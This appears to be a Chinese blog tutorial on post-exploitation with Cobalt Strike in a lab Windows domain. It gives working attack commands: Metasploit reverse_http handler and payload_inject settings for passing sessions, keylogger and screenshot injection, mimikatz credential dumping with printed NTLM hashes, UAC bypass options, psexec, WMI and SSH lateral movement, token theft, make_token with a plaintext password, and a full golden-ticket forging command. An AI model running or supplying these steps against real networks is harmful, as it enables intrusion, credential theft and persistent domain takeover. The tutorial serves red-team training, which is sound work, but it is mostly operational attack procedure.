+<h2 id="Browsing-probe-浏览探测"><a href="#Browsing-probe-浏览探测" class="headerlink" title="Browsing probe-浏览探测"></a>Browsing probe-浏览探测</h2><h3 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081131274.png"
+                     
+                ></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>beacon中使用portscan命令：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Use: portscan [目标列表] [端口列表] [arp|icmp|none] [最大连接数]</span><br><span class="line"></span><br><span class="line">对指定的 [主机列表] 启动端口扫描</span><br><span class="line"></span><br><span class="line">[目标列表] 是要扫描的主机列表，使用逗号分隔。 也可以指定IPv4</span><br><span class="line">地址段（例如192.168.1.128-192.168.2.240，192.168.1.0/24）</span><br><span class="line"></span><br><span class="line">[端口列表] 是要扫描的端口列表，使用逗号分隔。 也可以指定端口范围（例如1-65535）</span><br><span class="line"></span><br><span class="line">[arp|icmp|none] 选项用于指示端口扫描器如何确定主机是否存活</span><br><span class="line">ARP选项使用ARP来查看系统是否响应指定的地址，ICMP选项发送ICMP回显请求</span><br><span class="line">none选项告诉端口扫描器假定所有主机均存活</span><br><span class="line"></span><br><span class="line">[最大连接数] 选项可限制端口扫描器同时尝试连接的数量，端口扫描器使用异步I/O，</span><br><span class="line">能够一次处理大量连接，越高的连接数将扫的越快，默认值为1024</span><br></pre></td></tr></table></figure></div>
+
+<p>端口扫描可以选择扫描存活的方式：arp icmp none </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081132584.png"
+                     
+                ></p>
+<p>在beacon 使用命令 </p>
+<ol>
+<li>查看后台任务：jobs</li>
+<li>关闭任务：jobkill 任务id</li>
+</ol>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081134585.png"
+                     
+                ></p>
+<h3 id="文件浏览"><a href="#文件浏览" class="headerlink" title="文件浏览"></a>文件浏览</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081134271.png"
+                     
+                ></p>
+<h3 id="网络探测"><a href="#网络探测" class="headerlink" title="网络探测"></a>网络探测</h3><p>beacon 提供net命令，使用help net 了解这个命令的一些常用方法</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Use: net [命令] [参数]</span><br><span class="line"></span><br><span class="line">Beacon内置的主机和网络枚举探测工具。 支持的 [命令] 列表有：</span><br><span class="line"></span><br><span class="line">        命令                 描述</span><br><span class="line">        -------             -----------</span><br><span class="line">        computers           列出域中的主机（通过组）</span><br><span class="line">        domain              显示该主机的域</span><br><span class="line">        dclist              列出域控制器</span><br><span class="line">        domain_controllers  列出域控制器（通过组）</span><br><span class="line">        domain_trusts       列出域信任</span><br><span class="line">        group               列出组中的成员组和成员用户</span><br><span class="line">        localgroup          列出本地组中的成员组和成员用户</span><br><span class="line">        logons              列出登录到指定主机的用户</span><br><span class="line">        sessions            列出指定主机上的会话</span><br><span class="line">        share               列出指定主机上的共享</span><br><span class="line">        user                列出用户和用户信息</span><br><span class="line">        time                显示指定主机上的时间</span><br><span class="line">        view                列出域中的主机（通过browser服务）</span><br><span class="line"></span><br><span class="line">使用 &quot;help net [命令]&quot; 了解更多信息</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="进程列表"><a href="#进程列表" class="headerlink" title="进程列表"></a>进程列表</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081137322.png"
+                     
+                ></p>
+<h3 id="浏览器代理"><a href="#浏览器代理" class="headerlink" title="浏览器代理"></a>浏览器代理</h3><p>先把beacon时间交互设置为0，打开beacon交互模式。因为浏览器跳板是通过 beacon 会话来隧道通信传输数据的，所以 beacon 连接到团队服务器的频率会影响浏览器跳板的同步性。所以要把 beacon 会话设为交互模式来实现最好的效果。</p>
+<p>然后设置浏览器跳板代理( agent )。这一步实际上会完成两个任务：将 agent 程序注入受害机器的 IE 浏览器进程，在团队服务器的一个端口上开启一个 HTTP 代理服务器。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081138347.png"
+                     
+                ></p>
+<p>实际上，这个过程也可以通过browserprivot命令实现，停止方式 browserpivot stop。如果目标上登录某些网站，我们通过设置浏览器代理后，访问网站即可去登录访问目标网站</p>
+<h3 id="VNC交互"><a href="#VNC交互" class="headerlink" title="VNC交互"></a>VNC交互</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081139480.png"
+                     
+                ></p>
+<h2 id="Proxy-forwarding-代理转发"><a href="#Proxy-forwarding-代理转发" class="headerlink" title="Proxy forwarding-代理转发"></a>Proxy forwarding-代理转发</h2><h3 id="Socks代理"><a href="#Socks代理" class="headerlink" title="Socks代理"></a>Socks代理</h3><p>在指定端口上启动SOCKS4a代理服务器，该服务器将通过当前Beacon中继网络连接，假设存在以下环境：</p>
+<ul>
+<li><p>Teamserver：192.168.0.195</p>
+</li>
+<li><p>12server5：192.168.0.188 &amp; 10.10.10.139</p>
+</li>
+<li><p>12server4：10.10.10.138</p>
+</li>
+</ul>
+<p>获取12server5权限后设置socks代理</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081223062.png"
+                     
+                ></p>
+<p>设置</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/proxychains4.conf</span><br><span class="line">socks4 192.168.0.195 36721</span><br></pre></td></tr></table></figure></div>
+
+<p>使用proxychain调用nmap 扫描目标机子，在Windwos环境中使用其他同理</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn 10.10.10.138 -p 445</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="转发上线"><a href="#转发上线" class="headerlink" title="转发上线"></a>转发上线</h3><p>转发监听器可以利用已攻陷的机器作为代理，为其他Beacon会话的中转网络流量，即内网其他机器可通 过连接攻陷机器上线。</p>
+<ul>
+<li><p>teamserver 192.168.0.195</p>
+</li>
+<li><p>12server5 192.168.0.188 &amp; 10.10.10.139</p>
+</li>
+<li><p>目标机子 10.10.10.136</p>
+</li>
+</ul>
+<p>首先新建监听器 监听器使用当前会话</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081227436.png"
+                     
+                ></p>
+<p>接着生成后门，选择rve监听器</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081228754.png"
+                     
+                ></p>
+<p>在12server4上执行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081228476.png"
+                     
+                ></p>
+<p>切换视图</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081228629.png"
+                     
+                ></p>
+<p>这种方式也可用于多层网段反向上线。</p>
+<h3 id="VPN部署"><a href="#VPN部署" class="headerlink" title="VPN部署"></a>VPN部署</h3><p>为CovertVPN新建一个虚拟机网卡和监听器。当部署CovertVPN客户端后，你将相当于在目标网络中拥有一个二层网络的tap接口。</p>
+<p>新建vpn选择网卡</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081229341.png"
+                     
+                ></p>
+<p>在团队服务器中，配置刚刚的VPN接口，先连接到刚刚的VPN 接口，就能找到此设备，在kali上：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig phear7 10.10.10.0/24</span><br></pre></td></tr></table></figure></div>
+
+<p>对内网10段进行代码扫描</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -Pn 10.10.10.136 -p 445</span><br></pre></td></tr></table></figure></div>
+
+<p>回到 CS 的 VPN Interfaces 这里可以看到数据走 VPN 在收发：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081230320.png"
+                     
+                ></p>
+<h2 id="Beacon-conversation-信标会话"><a href="#Beacon-conversation-信标会话" class="headerlink" title="Beacon conversation-信标会话"></a>Beacon conversation-信标会话</h2><p>Cobalt Strike 的 Beacon 最初是一个稳定的生命线，让你可以保持对受害主机的访问权限。从一开始Beacon 的主要目的就是向其他的 Cobalt Strike 监听器传递权限。使用 spawn 命令来为一个监听器派生一个会话。此 spawn 命令接受一个架构（如：x86，x64）和一个监听器作为其参数。默认情况下， spawn 命令会在 rundll32.exe 中派生一个会话。</p>
+<h3 id="新建会话"><a href="#新建会话" class="headerlink" title="新建会话"></a>新建会话</h3><p>也可以使用spwan命令派生一个会话</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081303271.png"
+                     
+                ></p>
+<h3 id="注入进程获取会话"><a href="#注入进程获取会话" class="headerlink" title="注入进程获取会话"></a>注入进程获取会话</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081303105.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081305260.png"
+                     
+                ></p>
+<h3 id="派生会话到MSF"><a href="#派生会话到MSF" class="headerlink" title="派生会话到MSF"></a>派生会话到MSF</h3><p>当Cobaltstrike获取到上线主机后,有时候需要传递会话到MSF,首先建立新的Foreign HTTP监听器,设置IP为MSF接收的IP,设置Port是MSF监听的端口</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_http payload =&gt; windows/meterpreter/reverse_http</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 10.10.10.141 lhost =&gt; 10.10.10.141</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 8888 lport =&gt; 8888</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure></div>
+
+<p>设置CS监听器</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081306349.png"
+                     
+                ></p>
+<p>直接新建会话选择MSF监听器，或者在beacon使用命令spawn msf 将会话会派生到MSF里，当MSF运行后会收到会话。</p>
+<h3 id="MSF派生会话到CS"><a href="#MSF派生会话到CS" class="headerlink" title="MSF派生会话到CS"></a>MSF派生会话到CS</h3><p>如果Metasploit已经获取到了一个会话，可以通过payload_inject模块进行会话派生,将会话传递Cobaltstrike里。</p>
+<p>首先建立监听器</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081307679.png"
+                     
+                ></p>
+<p>在MSF中选择 payload_inject 模块，设置参数：disablepayloadhandler来禁止msf监听，建议使用版本较早的MSF，新版MSF会出现不可调和的问题，建议自己实际尝试。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use windows/local/payload_inject </span><br><span class="line">set disablepayloadhandler true</span><br><span class="line">set paylaod windows/meterpreter/reverse_http </span><br><span class="line">set lhost IP</span><br><span class="line">set lport 9999</span><br><span class="line">set session 1 </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081313437.png"
+                     
+                ></p>
+<h2 id="After-penetration-后渗透"><a href="#After-penetration-后渗透" class="headerlink" title="After penetration-后渗透"></a>After penetration-后渗透</h2><p>CS中有一个自带的凭证提权模块，包括抓取哈希，提权提升，创建令牌，伪造黄金票据，Powershell一句话上线，抓取明文密码，通过其他用户上线等功能继承</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081315726.png"
+                     
+                ></p>
+<h3 id="抓取Hash"><a href="#抓取Hash" class="headerlink" title="抓取Hash"></a>抓取Hash</h3><p>只有管理员权限才能抓取Hash</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081318746.png"
+                     
+                ></p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081323052.png"
+                     
+                ></p>
+<ol>
+<li>ms14-058</li>
+<li>ms15-051</li>
+<li>ms16-016</li>
+<li>ms16-032</li>
+</ol>
+<p>这些都是大家耳熟能详的Windows本地提权漏洞，在此插件中都已经集成</p>
+<ol start="5">
+<li>UAC-DLL</li>
+</ol>
+<p>这是一种绕过UAC的攻击，它试图将本地管理员运行的有效负载从低权限提升到高权限。此攻击使用 UAC漏洞将ArtifactKit生成的DLL复制到特权位置。此攻击适用于Windows7和Windows8及更高版本的未修补版本。</p>
+<ol start="6">
+<li>uac-token-duplication</li>
+</ol>
+<p>这是另一种绕过UAC的攻击，将其从低权限提升到高权限（作为本地管理员）。这种攻击使用一个UAC 漏洞，允许非提升进程使用从提升进程中窃取的令牌启动任意进程。此漏洞要求攻击删除分配给提升令 牌的多个权限。此攻击适用于Windows7及更高版本。如果AlwaysNotify处于其最高设置，则此攻击要 求提升的进程已在当前桌面会话中运行（作为同一用户）,此漏洞使用PowerShell生成会话。</p>
+<ol start="7">
+<li>Uac-eventvwr</li>
+</ol>
+<p>这种提权方法是利用时间查看器eventvwr，通过注册表之后，执行Eventvwr.exe会自动加载我们的A.exe(exp),这个时候他的权限就是高了，成功绕过UAV</p>
+<ol start="8">
+<li>Uac-wscript</li>
+</ol>
+<p>这种绕过uac提权的方法最初是在Empire框架中现身的，该方法只针对Windows7有效 提权方式 在网上找好的插件进行提取</p>
+<h3 id="伪造黄金票据"><a href="#伪造黄金票据" class="headerlink" title="伪造黄金票据"></a>伪造黄金票据</h3><p>获取相关的信息即可伪造票据，进行持久权限维持</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081320338.png"
+                     
+                ></p>
+<h3 id="创建令牌"><a href="#创建令牌" class="headerlink" title="创建令牌"></a>创建令牌</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081321144.png"
+                     
+                ></p>
+<h3 id="Poweshell一句话"><a href="#Poweshell一句话" class="headerlink" title="Poweshell一句话"></a>Poweshell一句话</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081321765.png"
+                     
+                ></p>
+<h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><p>键盘记录有使用2种方式 一种是进程注入 一种是直接使用</p>
+<p>选择一个进程来注入</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps              <span class="comment"># 查看进程列表</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081607146.png"
+                     
+                ></p>
+<p>可见 2640 是 notepad.exe 选择它来注入</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keylogger 2460 x64</span><br><span class="line"><span class="comment"># 有2个选项 x64 和 x86</span></span><br></pre></td></tr></table></figure></div>
+
+<p>在 View&gt;Keystrokes 可以看到键盘的记录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081607150.png"
+                     
+                ></p>
+<h3 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h3><p>和键盘记录一样可以选择一个进程进行截图</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshot 2640 x64 90</span><br></pre></td></tr></table></figure></div>
+
+<p>在 View&gt;Screenshost 可以看到截图</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081607148.png"
+                     
+                ></p>
+<h3 id="获取明文"><a href="#获取明文" class="headerlink" title="获取明文"></a>获取明文</h3><p>使用命令logopasswords获取Hash和明文，也是调用了自带的mimikatz模块</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081319244.png"
+                     
+                ></p>
+<h2 id="Lateral-penetration-横向渗透"><a href="#Lateral-penetration-横向渗透" class="headerlink" title="Lateral penetration-横向渗透"></a>Lateral penetration-横向渗透</h2><p>横向渗透攻击技术是复杂网络攻击中广泛使用的一种技术，特别是在高级持续威胁（Advanced Persistent Threats，APT）中更加热衷于使用这种攻击方法。攻击者可以利用这些技术，以被攻陷的系统为跳板，访问其他主机，获取包括邮箱、共享文件夹或者凭证信息在内的敏感资源。攻击者可以利用 这些敏感信息，进一步控制其他系统、提升权限或窃取更多有价值的凭证。借助此类攻击，攻击者最终 可能获取域控的访问权限，完全控制基于Windows系统的基础设施或与业务相关的关键账户。在提权后，我们可以用mimikatz 获取目标机的凭证，并进行内网横向移动</p>
+<p>使用网络探测列出信任主机</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081324146.png"
+                     
+                ></p>
+<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>一旦你有了域管理员或者是目标机器上的本地管理员域用户的令牌，你可以通过滥用这种信任关系来控制目标。</p>
+<p>输入 jump 来列出 Cobalt Strike 中注册的横向移动的选项。运行 <code>jump [module] [target] [listener]</code> 来尝试在远程目标上运行一个 payload。</p>
+<p>单独运行 remote-exec 命令来列举 Cobalt Strike 中注册的远程执行模块。使用 <code>remote-exec [module] [target] [command+args]</code> 来尝试在远程目标主机上运行特定的命令。</p>
+<h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><ol>
+<li>通过 ipc$ 连接，然后释放 psexesvc.exe 到目标机器。</li>
+<li>通过服务管理 SCManager 远程创建 psexecsvc 服务，并启动服务。</li>
+<li>客户端连接执行命令, 服务端启动相应的程序并执行回显数据。</li>
+</ol>
+<p>Cobalt Strike 中提供 2 种 psexec 用法</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psexec [host] [share] [listener]</span><br><span class="line">psexec_psh [host] [listener]</span><br></pre></td></tr></table></figure></div>
+
+<p>一种是用 psexec 生成会话 一种是利用 psexec 和 powershell 生成 psh 都与 powershell 有关。</p>
+<h4 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h4><p>WMI 的全称是 Windows Management Instrumentation, 它出现在所有的 Windows 操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的 Windows 系统, 攻击者使用 wmi 来进行攻击, 但 Windows 系统默认不会在日志中记录这些操作, 可以做到无日志, 攻击脚本无需写入到磁盘, 增加了隐蔽性, 越来越多的 apt 事件中使用 WMI 进行攻击，利用 WMI 可以进行信息收集、探测，反病毒和虚拟机检测，命令执行，权限持久化等操作。</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmi [host] [listener]</span><br></pre></td></tr></table></figure></div>
+
+<p>Cobalt Strike 也提供一个 GUI 来使得横向移动更加简单。切换到目标可视化表或转到 View → Targets 。导航到 [target] → Jump 并选择所需的横向移动选项。将打开以下对话框：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081608295.png"
+                     
+                ></p>
+<p>首先，决定你想用哪种信任来进行横向移动。如果你想使用你的某个 Beacon 中的令牌，勾选 Use session’s current access token （使用会话的当前访问令牌）框。你也可以使用凭据或哈希来进行横向移动。从凭据存储中选择凭据或者手动填写 User 、 Password 和 Domain 字段。Beacon 会使用此信息来为你生成一个访问令牌。记住，你需要在高权限的上下文（管理员权限）中执行这些操作才能生效。</p>
+<p>接下来，选择用于横向移动的监听器。在这种场景中，SMB Beacon 通常是一个很好的选择。最后，选择你想从哪个会话中执行横向移动攻击。Cobalt Strike 的异步攻击模型要求每一个攻击都从一个受害系统中执行。如果没有可以展开攻击的 Beacon 会话就没有可以执行此操作的选项。如果你在一个内部行动中，考虑 hook 一个你控制的 Windows 系统并以其作为你使用凭据或哈希攻击其他系统的起点。</p>
+<p>点击 Launch （启动）。Cobalt Strike 将激活选定 Beacon 的标签页并对其发出命令。攻击的反馈会展现在 Beacon 的控制台中。</p>
+<p>在执行端口扫描后，在目标视图中，选择一个目标，右键–&gt;登录–psexec，即可选择凭证进行横向移动右键点击横向移动，选择合适的模块进行登录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081325350.png"
+                     
+                ></p>
+<p>选择Hash进行登录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081325422.png"
+                     
+                ></p>
+<p>即可上线</p>
+<h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><p>当内网有 Linux 时 Cobalt Strike 也是考虑到的提供了 ssh 连接, 只需要用目标机的 beacon 去连接就可以了。</p>
+<p>直接连接</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh [target:port] [user] [pass]</span><br></pre></td></tr></table></figure></div>
+
+<p>ssh-key</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh [target:port] [user] [/path/to/key.pem]</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="窃取令牌"><a href="#窃取令牌" class="headerlink" title="窃取令牌"></a>窃取令牌</h3><p>使用命令ps，寻找进程，接着命令steal_token pid pid是进程的id 选择合适权限的进程id即可，如果存在域管，也可以获取域管理权限，或者直接进程会话的令牌</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081327699.png"
+                     
+                ></p>
+<p>然后使用会话的当前访问令牌即可上线</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081327207.png"
+                     
+                ></p>
+<p>可以使用命令rev2self 返回之前的权限。</p>
+<h3 id="制作令牌"><a href="#制作令牌" class="headerlink" title="制作令牌"></a>制作令牌</h3><p>使用make_token命令，将之前获取的生成一个命令访问目标主机，这里以访问域控为例</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; help make_token</span><br><span class="line">Use: make_token [域\用户名] [密码]</span><br><span class="line"></span><br><span class="line">克隆当前访问令牌，并在访问网络资源时设置为指定的用户名和密码</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make_token redteam\administrator QWEasd123</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081328026.png"
+                     
+                ></p>
+<p>与上面一直</p>
+<h3 id="伪造黄金票据-1"><a href="#伪造黄金票据-1" class="headerlink" title="伪造黄金票据"></a>伪造黄金票据</h3><p>黄金票据的原理就是用krbtgt的hash来伪造TGT的内容。更改里面的client参数与session key等。让TGS 以为我就是那个我所声称的人，当然我一般会声称自己是administrator。第四步主要是来验证客户端的 身份。</p>
+<p>所谓的黄金票据其实就是kerberos认证的第二个阶段中的tgs的ticket也就是TGT。这个ticket相当于对请 求端的一个身份认证的凭据，如果可以伪造这个ticket，那么就可以伪造任意身份，而黄金票据就是一个实现方式。</p>
+<p>首先获取获取域控的权限，得到权限后导出所有hash</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081330474.png"
+                     
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962 387:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:689fe33346a9e9fe229395fb36178ecb:::</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>域普通用户命令 whoai &#x2F;user 去掉后三位获取域SID：S-1-5-21-2536581826-3274276096-3456299113</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081331028.png"
+                     
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /user:Administrator /domain:redteam.club /sid:S-1-5- 21-2536581826-3274276096-3456299113 /krbtgt:689fe33346a9e9fe229395fb36178ecb</span><br><span class="line">/endin:480 /renewmax:10080 /ptt</span><br></pre></td></tr></table></figure></div>
+
+<p>使用mimikatz也可以，伪造好之后</p>
+<p>访问 shell dir \ad01\c$ 即可获取权限</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081331623.png"
+                     
+                ></p>
